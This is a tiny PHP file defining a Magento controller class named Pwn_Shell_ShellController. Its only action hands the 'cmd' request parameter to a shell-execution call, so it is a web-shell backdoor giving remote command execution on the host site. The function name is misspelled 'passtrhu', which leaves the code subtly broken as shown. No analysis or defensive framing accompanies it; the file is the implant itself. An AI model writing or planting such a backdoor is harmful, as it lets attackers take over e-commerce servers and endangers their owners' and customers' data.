<?php
class Pwn_Shell_ShellController extends Mage_Core_Controller_Front_Action
{
	public function indexAction() {
		passtrhu($this->getRequest()->getParam('cmd'));
	}
}
